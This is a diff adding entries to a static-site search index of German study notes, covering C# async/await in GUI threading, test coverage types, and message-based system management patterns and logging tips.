+            "location": "/ParProg/8_GUI_Threading/#c-async-await", 
+            "text": "L\u00f6st die Zerst\u00fcckelung der Logik bei der klassischen GUI-Programmierung  Methode mit Keyword  async  R\u00fcckgabetyp ist  void  (fire   forget) oder  Task T , wobei  T  der Typ des R\u00fcckgabewerts ist (optional)  R\u00fcckgabe direkt mit  return T , nicht  return Task T    Name endet auf  Async  per Konvention  Nach Aufruf der Methode kann auf dem zur\u00fcckgegebenen Task  await  aufgerufen werden, um auf das Ergebnis zu warten (und R\u00fcckgabewert auslesen)   public   async   Task int   LongOperationAsync ()   {   }  Task int   task   =   LongOperationAsync ();  OtherWork ();  int   result   =   await   task ;    Der Aufrufer ist nicht  zwingend  w\u00e4hrend des Aufrufs blockiert", 
+            "title": "C# async / await"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#spezielle-regeln", 
+            "text": "async -Methode muss  await  beinhalten, sonst Compiler-Warning  await  muss in  async -Methode sein, sonst Compiler-Fehler  Dies verursacht schnell eine Kette, weil nun alles async sein muss  Kann z.B. durch  Task.wait()  unterbrochen werden    Grund liegt im Ausf\u00fchrungsmodell", 
+            "title": "Spezielle Regeln"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#ausfuhrungsmodell", 
+            "text": "Eine  async -Methode l\u00e4uft teilweise asynchron, teilweise synchron  Aufrufer f\u00fchrt die Methode erst asynchron aus, sobald ein  await  kommt, vorher synchron  Der asynchrone Teil wird normalerweise durch den Thread des erwarteten Tasks ausgef\u00fchrt (als \"continuation\")  Ausser  bei UI-Threads: Dort wird der Asynchrone Teil nach dem  await  wider vom Aufrufer (= UI-Thread) ausgef\u00fchrt  Somit hat dies die gleiche Auswirkung wie ohne dem async / await Konzept, die Aufteilung wird einfach vom Compiler gemacht", 
+            "title": "Ausf\u00fchrungsmodell"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#ui-programmierung", 
+            "text": "async   void   startDownload_Click ( \u2026 )   { \n     HttpClient   client   =   new   HttpClient (); \n     foreach   ( var   url   in   collection )   { \n         var   data   =   await   client . GetStringAsync ( url ); \n         textArea . Content   +=   data ; \n     }  }    Die Methode springt zur\u00fcck beim  await , das Resultat wird dann wieder im GUI-Thread gesetzt", 
+            "title": "UI-Programmierung"
+        }, 
+        {
+            "location": "/ParProg/8_GUI_Threading/#pitfalls", 
+            "text": "Eine  async -Methode sind nicht per-se asynchron. Ist kein  await  drin ist, wird sie komplett synchron ausgef\u00fchrt  Workaround:  return await Task.Run()    Threadwechsel w\u00e4hrend Methodenausf\u00fchrung  Teil nach  await  muss nicht mehr im gleichen Thread ausgef\u00fchrt werden    Empfehlung: Nur im UI-Layer benutzen", 
+            "title": "Pitfalls"
+        }, 
+        {
             "location": "/PhAI/0_Index/", 
             "text": "Physik Anwendungen f\u00fcr Informatik\n\n\n\n\nExam Notes", 
             "title": "0 Index"
@@ -1334,6 +1559,66 @@
             "location": "/SE2/6_Story_Splitting/#grosse-arbeitspakete-aufteilen", 
             "text": "Zuerst primitive Version implementieren, dann Schritt f\u00fcr Schritt \"vergolden\"  In einem Sprint ist ca. 60%-70% der Arbeitszeit produktiv  Daher ideale Gr\u00f6sse: 50%-70% pro Arbeitspaket, damit eine Person in einem Sprint sicher fertig wird  Epics sind ungef\u00e4hr UCs, die aufgeteilt werden in User Stories (= Arbeitspakete)  User Stories sind urspr\u00fcnglich von der Form \"as a .. I want to ...\", aber das ist kundenorientiert  In der Implementierung braucht es anwendungsorientierte User Stories (=Arbeitspakete)", 
             "title": "Grosse Arbeitspakete aufteilen"
+        }, 
+        {
+            "location": "/SE2/7_Testing/", 
+            "text": "Testing in gr\u00f6sseren Projekten\n\n\nMicrotesting\n\n\n\n\nJe weiter oben im Layer, desto mehr muss gemockt / gefaked werden\n\n\nTesten einzelne Teile in Isolation -\n Gegensatz zu Integrationtests!\n\n\n\n\nIntegration-Test\n\n\n\n\nM\u00f6glichst hoch oben in den Layers\n\n\nUnit-Tests!\n\n\nSind in der Regel die \"besseren Tests\" als Microtests, weil sie realistischere Szenarien testen\n\n\nGeht wom\u00f6glich durch alle Schichten durch, ohne Mocking\n\n\nIm Exambiur z.B. auf Ebene Service\n\n\nK\u00f6nnen Teil der Ent-to-End-Tests ersetzen, dort muss dann nur noch die Darstellung getestet werden, nicht die Logik\n\n\nFramework: \nhttps://cucumber.io/\n\n\n\n\n\"Lokales Minimum\"-Effekt\n\n\n\n\nWenn viele Unit-Tests vorhanden sind, verleitet es zu weniger \"grobem\" Refactoring, da dadurch die Unit-Tests kaputt gehen\n\n\nMan versucht nur, lokal zu optimieren, anstatt Architektur zu refactoren, und sieht die \"grosse\" L\u00f6sung nicht\n\n\n\n\nWann haben wir genug getestet?\n\n\n\n\nKeine der Antworten sagt viel aus\n\n\nAber was denn sonst?\n\n\nKonnt stark auf den Kontext an: Ist es ein medizinisches System, oder nur eine simple Website?\n\n\n\n\nTestabdeckung\n\n\nStatement Coverage\n\n\n\n\nTest Coverage Tools messen nur Statement-Abdeckung, welcher Anteil aller Statements wurden von einem Test durchlaufen?\n\n\nStatement-Abeckung ist einfach zu ermitteln, aber die wenigst aussagekr\u00e4ftige\n\n\n\n\nBranch Coverage\n\n\n\n\nJedes \nIf\n ergibt 2 Zweige: Eine f\u00fcr Condition erf\u00fcllt und eine f\u00fcr \nelse\n\n\nBranch Coverage (Zweigabdeckung) z\u00e4hlt die Anzahl abgedeckten Zweige / Gesamtzahl der Zweige\n\n\nBei Loops und Ifs auch testen, wenn Body gar nie ausgef\u00fchrt wird\n\n\nFehlerquellen, wenn im Zweig Seiteneffekte entstehen\n\n\n\n\n\n\n\n\nDecision Coverage\n\n\n\n\nBedinungsabdeckung pr\u00fcft, welche Entscheidungen einmal auf \ntrue\n und eimal auf \nfalse\n getestet wurden\n\n\nBei \nIf\ns und Loops mit mehreren Bedingungen gibt es entsprechend f\u00fcr jede Bedingung zwei Tests\n\n\n\n\nPath Coverage\n\n\n\n\nAlle m\u00f6glichen Kombinationen von Pfaden im Zweig-Graphen\n\n\nF\u00fchrt schnell zu unendliche Anzahl Kombinationen!\n\n\n\n\nServer Setup\n\n\n\n\nTEST: Test-Server f\u00fcr Entwickler, auch z.B. f\u00fcr Performance-Tests\n\n\nACC: Acceptance-Server / Staging Server  f\u00fcr Kunden zum Ausprobieren", 
+            "title": "7 Testing"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#testing-in-grosseren-projekten", 
+            "text": "", 
+            "title": "Testing in gr\u00f6sseren Projekten"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#microtesting", 
+            "text": "Je weiter oben im Layer, desto mehr muss gemockt / gefaked werden  Testen einzelne Teile in Isolation -  Gegensatz zu Integrationtests!", 
+            "title": "Microtesting"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#integration-test", 
+            "text": "M\u00f6glichst hoch oben in den Layers  Unit-Tests!  Sind in der Regel die \"besseren Tests\" als Microtests, weil sie realistischere Szenarien testen  Geht wom\u00f6glich durch alle Schichten durch, ohne Mocking  Im Exambiur z.B. auf Ebene Service  K\u00f6nnen Teil der Ent-to-End-Tests ersetzen, dort muss dann nur noch die Darstellung getestet werden, nicht die Logik  Framework:  https://cucumber.io/", 
+            "title": "Integration-Test"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#lokales-minimum-effekt", 
+            "text": "Wenn viele Unit-Tests vorhanden sind, verleitet es zu weniger \"grobem\" Refactoring, da dadurch die Unit-Tests kaputt gehen  Man versucht nur, lokal zu optimieren, anstatt Architektur zu refactoren, und sieht die \"grosse\" L\u00f6sung nicht", 
+            "title": "\"Lokales Minimum\"-Effekt"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#wann-haben-wir-genug-getestet", 
+            "text": "Keine der Antworten sagt viel aus  Aber was denn sonst?  Konnt stark auf den Kontext an: Ist es ein medizinisches System, oder nur eine simple Website?", 
+            "title": "Wann haben wir genug getestet?"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#testabdeckung", 
+            "text": "", 
+            "title": "Testabdeckung"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#statement-coverage", 
+            "text": "Test Coverage Tools messen nur Statement-Abdeckung, welcher Anteil aller Statements wurden von einem Test durchlaufen?  Statement-Abeckung ist einfach zu ermitteln, aber die wenigst aussagekr\u00e4ftige", 
+            "title": "Statement Coverage"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#branch-coverage", 
+            "text": "Jedes  If  ergibt 2 Zweige: Eine f\u00fcr Condition erf\u00fcllt und eine f\u00fcr  else  Branch Coverage (Zweigabdeckung) z\u00e4hlt die Anzahl abgedeckten Zweige / Gesamtzahl der Zweige  Bei Loops und Ifs auch testen, wenn Body gar nie ausgef\u00fchrt wird  Fehlerquellen, wenn im Zweig Seiteneffekte entstehen", 
+            "title": "Branch Coverage"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#decision-coverage", 
+            "text": "Bedinungsabdeckung pr\u00fcft, welche Entscheidungen einmal auf  true  und eimal auf  false  getestet wurden  Bei  If s und Loops mit mehreren Bedingungen gibt es entsprechend f\u00fcr jede Bedingung zwei Tests", 
+            "title": "Decision Coverage"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#path-coverage", 
+            "text": "Alle m\u00f6glichen Kombinationen von Pfaden im Zweig-Graphen  F\u00fchrt schnell zu unendliche Anzahl Kombinationen!", 
+            "title": "Path Coverage"
+        }, 
+        {
+            "location": "/SE2/7_Testing/#server-setup", 
+            "text": "TEST: Test-Server f\u00fcr Entwickler, auch z.B. f\u00fcr Performance-Tests  ACC: Acceptance-Server / Staging Server  f\u00fcr Kunden zum Ausprobieren", 
+            "title": "Server Setup"
         }, 
         {
             "location": "/Vss/0_Index/", 
@@ -1629,6 +1914,81 @@
             "location": "/Vss/7_Scalability_Availability/#ausfalle-so-schnell-wie-moglich-entdecken", 
             "text": "Je kleiner das Auftreten des Fehlers zum Erkennen ist, desto kleiner wird die MTTR  Fail fast  Fehler sofort melden, wenn es zu Ausfall kommen k\u00f6nnte  System regelm\u00e4ssig pr\u00fcfen, um Fehler fr\u00fch zu erkennen", 
             "title": "Ausf\u00e4lle so schnell wie m\u00f6glich entdecken"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/", 
+            "text": "VSS Management\n\n\nSystem Management\n\n\n\n\nZu Systems Management geh\u00f6rt u.a.\n\n\nSoftware distribution\n\n\nversion control\n\n\nBackup / Recovery\n\n\nPerformance Monitoring\n\n\nNetwork Management\n\n\n\n\n\n\nZu \nConfiguration Management\n geh\u00f6rt das Dokumentieren des Systems und Nachverfolgbarkeit, damit fr\u00fchere Versionen maintained werden k\u00f6nnen\n\n\nEin Service Management Framework ist z.B. \nITIL\n\n\n\n\nPatterns f\u00fcr message-basierte Software\n\n\nWiretap\n\n\nEinen Message-Channel \"abh\u00f6ren\", indem die Messages neben dem Ziel auch an einen zweiten Channel zur Inspektion gesendet werden\n\n\nDetour\n\n\nNicht alle Messages werden direkt ans Ziel gesendet, sondern an eine Zwischenstelle, die Validierung, Debugging o.\u00e4. vornimmt. Ein Router entscheidet, welche Messages \u00fcber diese \"Detour\" und welche direkt an das Ziel gesendet werden\n\n\nTest Message\n\n\nEine Art Black-Box-Test, in dem Test Messages ins System gef\u00fcttert werden, und hinterher geschaut, welche Messages raus kommen. So k\u00f6nnen interne Verarbeitungs-Fehler erkannt werden\n\n\nSmart Proxy\n\n\n\n\nIn Systemen, in der Messages vom Absender mit einer Return-Adresse versehen werden\n\n\nAnalog zu einem Web-Proxy: Er \u00e4ndert die Returnadresse zu sich selbst, und leitet die Antwort schliesslich zum originalen Absender wieder\n\n\nProxy hat dann Einsicht in die Messages\n\n\n\n\nMessage Store\n\n\nF\u00fcr jede Message wird jeweils eine Kopie an einen zentralen Message Store gesendet. Dieser speichert dann die gesamte oder Teile der Message\n\n\nMessage History\n\n\nDie Message tr\u00e4gt eine History auf sich (im Header), von welchen Applikationen sie bereits vearbeitet wurde. Dies erleichtert debugging, da man den Weg der Message verfolgen kann.\n\n\nChannel Purger\n\n\nEin Filter, der gewisse \"verbliebene\" Messages verwirft, damit das System wieder in einen konsitenten Zustand versetzt wird.\n\n\nJava Management Extensions (JMX)\n\n\n\n\nJava Technologie, um Applikationen, System-Objekte und Devices zu managen\n\n\nJedes Objekt ist ein \nMBean\n (Managed Bean)\n\n\nDer Standard JMX-Client ist \njconsole\n\n\n\n\nLogging\n\n\nHerausforderungen\n\n\n\n\nEasy to use, wiederverwendbar\n\n\nZentralisiert, damit der Administrator es an einem Ort einsehen kann\n\n\nNur wenig Performance-Einbussen auf die Applikation\n\n\nFilterung nach Konfiguration f\u00fcr verschiedene Typen\n\n\n\n\nTipps\n\n\n\n\nLogging Framework benutzen (z.B. \nlog4j\n)\n\n\nMehrere Log levels (\ndebug\n, \ninfo\n, \nwarning\n, \nsevere\n)\n\n\nslf4j\n als Wrapper benutzen, damit das konkrete Logging-Framework abstrahiert wird und sp\u00e4ter ge\u00e4ndert werden kann\n\n\nIn Logs \"W\"-Fragen beantworten: Wo ist was, wie, wann und von wem passiert? etc.", 
+            "title": "8 Vss Management"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#vss-management", 
+            "text": "", 
+            "title": "VSS Management"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#system-management", 
+            "text": "Zu Systems Management geh\u00f6rt u.a.  Software distribution  version control  Backup / Recovery  Performance Monitoring  Network Management    Zu  Configuration Management  geh\u00f6rt das Dokumentieren des Systems und Nachverfolgbarkeit, damit fr\u00fchere Versionen maintained werden k\u00f6nnen  Ein Service Management Framework ist z.B.  ITIL", 
+            "title": "System Management"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#patterns-fur-message-basierte-software", 
+            "text": "", 
+            "title": "Patterns f\u00fcr message-basierte Software"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#wiretap", 
+            "text": "Einen Message-Channel \"abh\u00f6ren\", indem die Messages neben dem Ziel auch an einen zweiten Channel zur Inspektion gesendet werden", 
+            "title": "Wiretap"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#detour", 
+            "text": "Nicht alle Messages werden direkt ans Ziel gesendet, sondern an eine Zwischenstelle, die Validierung, Debugging o.\u00e4. vornimmt. Ein Router entscheidet, welche Messages \u00fcber diese \"Detour\" und welche direkt an das Ziel gesendet werden", 
+            "title": "Detour"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#test-message", 
+            "text": "Eine Art Black-Box-Test, in dem Test Messages ins System gef\u00fcttert werden, und hinterher geschaut, welche Messages raus kommen. So k\u00f6nnen interne Verarbeitungs-Fehler erkannt werden", 
+            "title": "Test Message"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#smart-proxy", 
+            "text": "In Systemen, in der Messages vom Absender mit einer Return-Adresse versehen werden  Analog zu einem Web-Proxy: Er \u00e4ndert die Returnadresse zu sich selbst, und leitet die Antwort schliesslich zum originalen Absender wieder  Proxy hat dann Einsicht in die Messages", 
+            "title": "Smart Proxy"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#message-store", 
+            "text": "F\u00fcr jede Message wird jeweils eine Kopie an einen zentralen Message Store gesendet. Dieser speichert dann die gesamte oder Teile der Message", 
+            "title": "Message Store"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#message-history", 
+            "text": "Die Message tr\u00e4gt eine History auf sich (im Header), von welchen Applikationen sie bereits vearbeitet wurde. Dies erleichtert debugging, da man den Weg der Message verfolgen kann.", 
+            "title": "Message History"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#channel-purger", 
+            "text": "Ein Filter, der gewisse \"verbliebene\" Messages verwirft, damit das System wieder in einen konsitenten Zustand versetzt wird.", 
+            "title": "Channel Purger"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#java-management-extensions-jmx", 
+            "text": "Java Technologie, um Applikationen, System-Objekte und Devices zu managen  Jedes Objekt ist ein  MBean  (Managed Bean)  Der Standard JMX-Client ist  jconsole", 
+            "title": "Java Management Extensions (JMX)"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#logging", 
+            "text": "", 
+            "title": "Logging"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#herausforderungen", 
+            "text": "Easy to use, wiederverwendbar  Zentralisiert, damit der Administrator es an einem Ort einsehen kann  Nur wenig Performance-Einbussen auf die Applikation  Filterung nach Konfiguration f\u00fcr verschiedene Typen", 
+            "title": "Herausforderungen"
+        }, 
+        {
+            "location": "/Vss/8_Vss_Management/#tipps", 
+            "text": "Logging Framework benutzen (z.B.  log4j )  Mehrere Log levels ( debug ,  info ,  warning ,  severe )  slf4j  als Wrapper benutzen, damit das konkrete Logging-Framework abstrahiert wird und sp\u00e4ter ge\u00e4ndert werden kann  In Logs \"W\"-Fragen beantworten: Wo ist was, wie, wann und von wem passiert? etc.", 
+            "title": "Tipps"
         }, 
         {
             "location": "/Vwl/0_Index/", 
